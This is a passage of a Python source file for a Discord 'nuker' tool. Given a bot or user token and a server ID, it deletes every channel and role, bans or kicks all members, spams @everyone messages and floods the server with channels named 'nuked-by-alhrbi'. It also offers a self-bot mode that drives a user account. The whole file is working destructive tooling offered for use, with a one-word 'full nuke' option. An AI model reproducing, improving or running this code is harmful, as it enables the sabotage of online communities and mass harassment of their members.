⠀⠀⠀⠀⠐⠈⡀⠐⠀⠀⠀⠀⠈⠀⠀⠀⢣⠟⣮⠳⡝⢯⡳⢏⡟⣳⠯⠿⣽⢻⢯⡟⡿⣟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠔⠋⠀⢀⣠⠴⠒⠒⠁⠀⠀⢀⠆⠀⠀⠀⠀⠀⠈⡒⣦⡈⣿⡃⠀⠀⠀⡨⡇⢢⠡⢄⡡⢊⠔⡡⢒⠀⠀⠮⡝⢮⡙⠧⣋⠜⢢⠑⡊⠴⠉⢆⠩⠒⠡⠉⠄⡁⠠⠐⠀⠈⠀⠀
⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⢀⠈⡀⢀⠁⡀⢀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⢀⣠⠤⠞⠁⢀⣤⠶⠒⠒⠚⠁⠀⠀⠀⠀⠀⠀⠀⠳⠝⠻⠚⡄⠀⣠⣼⣷⡇⠠⢈⠄⣀⠂⠄⠀⠀⠀⠀⠀⣀⠀⣀⠀⡀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⢂⠐⠀⠀⠈⢀⠀⠀
"""

async def type_art(art, speed=0.001):
    lines = art.split('\n')
    for line in lines:
        if line.strip():
            print(YELLOW + line)
            await asyncio.sleep(speed)
    print()

async def show_art(choice):
    if choice in ['1', '2', '3', '4', '5', '6']:
        print(YELLOW + "=" * 60)
        await type_art(DRAGON, 0.0005)
        print(YELLOW + "=" * 60)
    elif choice in ['7', '8']:
        print(YELLOW + "=" * 60)
        await type_art(FACE, 0.0005)
        print(YELLOW + "=" * 60)
    elif choice == '9':
        print(YELLOW + "=" * 60)
        await type_art(BYE, 0.001)
        print(YELLOW + "=" * 60)
    elif choice == 'alhrbi':
        print(YELLOW + "=" * 60)
        await type_art(ALHRBI_ART, 0.0005)
        print(YELLOW + "=" * 60)

def print_logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(YELLOW + "=" * 60)
    print(YELLOW + LOGO_MAIN)
    print(YELLOW + "=" * 60)
    print(YELLOW +    "by : MaybeRayan")
    print(YELLOW + "Owner : mayberayanalhrbi")
    print(YELLOW + "=" * 60)

async def del_channel(ch):
    try:
        await ch.delete()
        return True
    except:
        return False

async def del_role(r):
    try:
        await r.delete()
        return True
    except:
        return False

async def ban_member(m):
    try:
        await m.ban(reason="Tool", delete_message_days=0)
        return True
    except:
        return False

async def kick_member(m):
    try:
        await m.kick(reason="Tool")
        return True
    except:
        return False

async def create_ch(g, name):
    try:
        return await g.create_text_channel(name=name)
    except:
        return None

async def rename_ch(ch, name):
    try:
        await ch.edit(name=name)
        return True
    except:
        return False

async def send_msg(ch, msg):
    try:
        await ch.send(msg + " @everyone")
        return True
    except:
        return False

async def nuke_guild(g):
    global cancel
    reset_cancel()
    
    printc("[+] Deleting all channels...")
    chs = list(g.channels)
    if chs:
        for ch in chs:
            if check_cancel():
                break
            await del_channel(ch)
            await asyncio.sleep(0.05)
    printc("[+] Channels deleted")
    
    printc("[+] Deleting all roles...")
    roles = [r for r in g.roles if r.name != "@everyone" and r < g.me.top_role]
    if roles:
        for r in roles:
            if check_cancel():
                break
            await del_role(r)
            await asyncio.sleep(0.05)
    printc("[+] Roles deleted")
    
    printc("[+] Banning all members...")
    members = [m for m in g.members if m != g.me and m != g.owner and m.top_role < g.me.top_role]
    if members:
        for m in members:
            if check_cancel():
                break
            await ban_member(m)
            await asyncio.sleep(0.02)
    printc("[+] Members banned")
    
    printc("[+] Creating new channels...")
    channel_names = ["alhrbi", "nuked-by-alhrbi", "alhrbi-was-here", "maybe-alhrbi", "alhrbi-community"]
    for i in range(50):
        if check_cancel():
            break
        name = random.choice(channel_names)
        await create_ch(g, name)
        await asyncio.sleep(0.05)
    printc("[+] Channels created")
    
    reset_cancel()

async def handle_delete_channels(g):
    global cancel
    reset_cancel()
    await show_art('1')
    printc("[+] Deleting all channels...")
    chs = list(g.channels)
    if not chs:
        printc("[X] No channels found")
        inp("Press Enter...")
        return
    printc(f"[+] Found {len(chs)} channels")
    task = asyncio.create_task(wait_cancel())
    tasks = []
    cancelled = False
    for ch in chs:
        if check_cancel():
            cancelled = True
            break
        tasks.append(del_channel(ch))
        await asyncio.sleep(0.05)
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
    task.cancel()
    reset_cancel()
    printc("[!] Cancelled" if cancelled else "[+] All channels deleted")
    printc("[+] Press Enter to return")
    inp("")

async def handle_delete_roles(g):
    global cancel
    reset_cancel()
    await show_art('2')
    printc("[+] Deleting all roles...")
    roles = [r for r in g.roles if r.name != "@everyone" and r < g.me.top_role]
    if not roles:
        printc("[X] No roles found")
        inp("Press Enter...")
        return
    printc(f"[+] Found {len(roles)} roles")
    task = asyncio.create_task(wait_cancel())
    tasks = []
    cancelled = False
    for r in roles:
        if check_cancel():
            cancelled = True
            break
        tasks.append(del_role(r))
        await asyncio.sleep(0.05)
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
    task.cancel()
    reset_cancel()
    printc("[!] Cancelled" if cancelled else "[+] All roles deleted")
    printc("[+] Press Enter to return")
    inp("")

async def handle_create_channels(g):
    global cancel
    reset_cancel()
    await show_art('3')
    printc("[+] Creating channels...")
    count = inp("[?] How many? : ").strip()
    if not count.isdigit():
        return
    count = int(count)
    task = asyncio.create_task(wait_cancel())
    tasks = []
    cancelled = False
    for i in range(count):
        if check_cancel():
            cancelled = True
            break
        name = random.choice(NAMES)
        tasks.append(create_ch(g, name))
        await asyncio.sleep(0.05)
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
    task.cancel()
    reset_cancel()
    printc("[!] Cancelled" if cancelled else f"[+] Created {count} channels")
    printc("[+] Press Enter to return")
    inp("")

async def handle_rename_channels(g):
    global cancel
    reset_cancel()
    await show_art('4')
    printc("[+] Renaming channels...")
    chs = list(g.text_channels)
    if not chs:
        printc("[X] No channels found")
        inp("Press Enter...")
        return
    printc(f"[+] Found {len(chs)} channels")
    task = asyncio.create_task(wait_cancel())
    tasks = []
    cancelled = False
    for ch in chs:
        if check_cancel():
            cancelled = True
            break
        name = random.choice(NAMES)
        tasks.append(rename_ch(ch, name))
        await asyncio.sleep(0.05)
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
    task.cancel()
    reset_cancel()
    printc("[!] Cancelled" if cancelled else f"[+] Renamed {len(chs)} channels")
    printc("[+] Press Enter to return")
    inp("")

async def handle_rename_custom(g):
    global cancel
    reset_cancel()
    await show_art('5')
    printc("[+] Renaming with custom names...")
    chs = list(g.text_channels)
    if not chs:
        printc("[X] No channels found")
        inp("Press Enter...")
        return
    printc("[+] Enter names separated by dot (.)")
    printc("[+] Example: name1 . name2 . name3")
    print()
    names_in = inp("[?] Names: ").strip()
    if not names_in:
        return
    names = [n.strip() for n in names_in.split('.') if n.strip()]
    if not names:
        printc("[X] No valid names")
        inp("Press Enter...")
        return
    printc(f"[+] Using {len(names)} names")
    printc(f"[+] Renaming {len(chs)} channels...")
    task = asyncio.create_task(wait_cancel())
    tasks = []
    cancelled = False
    done = 0
    for i, ch in enumerate(chs):
        if check_cancel():
            cancelled = True
            break
        new_name = names[i % len(names)]
        tasks.append(rename_ch(ch, new_name))
        done += 1
        await asyncio.sleep(0.05)
    if tasks:
        results = await asyncio.gather(*tasks, return_exceptions=True)
        done = sum(1 for r in results if r == True)
    task.cancel()
    reset_cancel()
    printc("[!] Cancelled" if cancelled else f"[+] Renamed {done} channels")
    printc("[+] Press Enter to return")
    inp("")

async def handle_send_all(g):
    global cancel
    reset_cancel()
    await show_art('6')
    printc("[+] Sending messages...")
    chs = [ch for ch in g.text_channels if ch.permissions_for(g.me).send_messages]
    if not chs:
        printc("[X] No channels found")
        inp("Press Enter...")
        return
    msg = inp("[?] Message: ").strip()
    if not msg:
        return
    count = inp("[?] Per channel: ").strip()
    if not count.isdigit():
        return
    count = int(count)
    task = asyncio.create_task(wait_cancel())
    tasks = []
    total = 0
    cancelled = False
    for ch in chs:
        for _ in range(count):
            if check_cancel():
                cancelled = True
                break
            tasks.append(send_msg(ch, msg))
            total += 1
            await asyncio.sleep(0.05)
        if cancelled:
            break
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
    task.cancel()
    reset_cancel()
    printc("[!] Cancelled" if cancelled else f"[+] Sent {total} messages")
    printc("[+] Press Enter to return")
    inp("")

async def handle_ban_all(g):
    global cancel
    reset_cancel()
    await show_art('7')
    printc("[+] Banning all members...")
    members = [m for m in g.members if m != g.me and m != g.owner and m.top_role < g.me.top_role]
    if not members:
        printc("[+] No members to ban")
        inp("Press Enter...")
        return
    printc(f"[+] Banning {len(members)} members...")
    task = asyncio.create_task(wait_cancel())
    tasks = []
    cancelled = False
    for m in members:
        if check_cancel():
            cancelled = True
            break
        tasks.append(ban_member(m))
        await asyncio.sleep(0.02)
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
    task.cancel()
    reset_cancel()
    printc("[!] Cancelled" if cancelled else f"[+] Banned {len(members)} members")
    printc("[+] Press Enter to return")
    inp("")

async def handle_kick_all(g):
    global cancel
    reset_cancel()
    await show_art('8')
    printc("[+] Kicking all members...")
    members = [m for m in g.members if m != g.me and m != g.owner and m.top_role < g.me.top_role]
    if not members:
        printc("[+] No members to kick")
        inp("Press Enter...")
        return
    printc(f"[+] Kicking {len(members)} members...")
    task = asyncio.create_task(wait_cancel())
    tasks = []
    cancelled = False
    for m in members:
        if check_cancel():
            cancelled = True
            break
        tasks.append(kick_member(m))
        await asyncio.sleep(0.02)
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
    task.cancel()
    reset_cancel()
    printc("[!] Cancelled" if cancelled else f"[+] Kicked {len(members)} members")
    printc("[+] Press Enter to return")
    inp("")

async def handle_alhrbi(g):
    await show_art('alhrbi')
    printc("[+] Starting full nuke...")
    printc("[+] This will delete everything and ban all members")
    confirm = inp("[?] Are you sure? (y/n): ").strip().lower()
    if confirm != 'y':
        printc("[!] Cancelled")
        inp("Press Enter...")
        return
    
    await nuke_guild(g)
    printc("[+] Nuke completed!")
    printc("[+] Press Enter to return")
    inp("")

async def menu(g):
    while True:
        print_logo()
        printc("╔══════════════════════════════════════════╗")
        printc("║              MAIN MENU                  ║")
        printc("╠══════════════════════════════════════════╣")
        printc("║  1. Delete All Channels                 ║")
        printc("║  2. Delete All Roles                    ║")
        printc("║  3. Create Channels                     ║")
        printc("║  4. Rename All Channels (Random)        ║")
        printc("║  5. Rename Channels (Custom Names)      ║")
        printc("║  6. Send Message to All Channels        ║")
        printc("║  7. Ban All Members                     ║")
        printc("║  8. Kick All Members                    ║")
        printc("║  9. Exit                                ║")
        printc("║  Type 'alhrbi' for FULL NUKE            ║")
        printc("╚══════════════════════════════════════════╝")
        choice = inp("[?] Choose: ").strip()
        if not choice:
            continue
        try:
            if choice == '1':
                await handle_delete_channels(g)
            elif choice == '2':
                await handle_delete_roles(g)
            elif choice == '3':
                await handle_create_channels(g)
            elif choice == '4':
                await handle_rename_channels(g)
            elif choice == '5':
                await handle_rename_custom(g)
            elif choice == '6':
                await handle_send_all(g)
            elif choice == '7':
                await handle_ban_all(g)
            elif choice == '8':
                await handle_kick_all(g)
            elif choice == '9':
                await show_art('9')
                printc("[+] Exiting...")
                await bot.close()
                break
            elif choice.lower() == 'alhrbi':
                await handle_alhrbi(g)
        except Exception as e:
            printc(f"[!] Error: {e}")
            inp("Press Enter...")

async def start():
    global bot
    while True:
        print_logo()
        token = inp("[+] Token: ").strip()
        if not token:
            continue
        try:
            gid = int(inp("[+] Guild ID: ").strip())
        except ValueError:
            printc("[X] Invalid Guild ID!")
            continue
        print()
        printc("1. Bot Token")
        printc("2. User Token (Self-Bot)")
        print()
        choice = inp("[?] Choose: ").strip()
        try:
            if choice == "2":
                bot = commands.Bot(command_prefix="!", self_bot=True, intents=intents)
                @bot.event
                async def on_ready():
                    print_logo()
                    g = bot.get_guild(gid)
                    if g:
                        printc(f"[+] Connected: {g.name}")
                        await menu(g)
                    else:
                        printc("[X] Guild not found")
                        await bot.close()
                try:
                    await bot.start(token, bot=False)
                    break
                except:
                    printc("[X] Connection failed")
                    continue
            else:
                bot = commands.Bot(command_prefix="!", intents=intents)
                @bot.event
                async def on_ready():
                    print_logo()
                    g = bot.get_guild(gid)
                    if g:
                        printc(f"[+] Connected: {g.name}")
                        await menu(g)
                    else:
                        printc("[X] Guild not found")
                        await bot.close()
                try:
                    await bot.start(token)
                    break
                except:
                    printc("[X] Connection failed")
                    continue
        except Exception as e:
            printc(f"[X] Error: {e}")
            continue

if __name__ == "__main__":
    asyncio.run(start())
